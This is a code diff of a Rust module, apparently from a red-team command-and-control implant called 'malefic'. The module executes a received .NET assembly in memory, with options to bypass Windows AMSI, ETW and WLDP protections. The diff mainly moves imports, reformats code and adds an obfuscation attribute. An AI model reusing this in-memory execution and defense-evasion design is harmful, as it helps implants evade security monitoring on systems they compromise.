@@ -1,7 +1,9 @@
-use malefic_proto::proto::modulepb::BinaryResponse;
-use malefic_helper::win::kit::bypass::{bypass_amsi, bypass_etw, bypass_wldp, enable_amsi, enable_etw, enable_wldp};
-use malefic_helper::win::kit::clr::exec_assemble_in_memory;
 use crate::prelude::*;
+use malefic_os_win::kit::bypass::{
+    bypass_amsi, bypass_etw, bypass_wldp, enable_amsi, enable_etw, enable_wldp,
+};
+use malefic_os_win::kit::clr::exec_assemble_in_memory;
+use malefic_proto::proto::modulepb::BinaryResponse;
 
 pub struct ExecuteAssembly {}
 
@@ -10,13 +12,14 @@ pub struct ExecuteAssembly {}
 impl Module for ExecuteAssembly {}
 
 #[async_trait]
-impl malefic_proto::module::ModuleImpl for ExecuteAssembly {
+#[obfuscate]
+impl malefic_module::ModuleImpl for ExecuteAssembly {
     #[allow(unused_variables)]
     async fn run(
         &mut self,
         id: u32,
-        receiver: &mut malefic_proto::module::Input,
-        sender: &mut malefic_proto::module::Output,
+        receiver: &mut malefic_module::Input,
+        sender: &mut malefic_module::Output,
     ) -> ModuleResult {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
         let amsi_bypass = request.param.contains_key("bypass_amsi");
@@ -48,12 +51,14 @@ impl malefic_proto::module::ModuleImpl for ExecuteAssembly {
             }
         }
 
-        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse{
-            status: 0,
-            message: Vec::new(),
-            data: result,
-            err: "".to_string(),
-        })))
+        Ok(TaskResult::new_with_body(
+            id,
+            Body::BinaryResponse(BinaryResponse {
+                status: 0,
+                message: Vec::new(),
+                data: result,
+                err: "".to_string(),
+            }),
+        ))
     }
-
 }
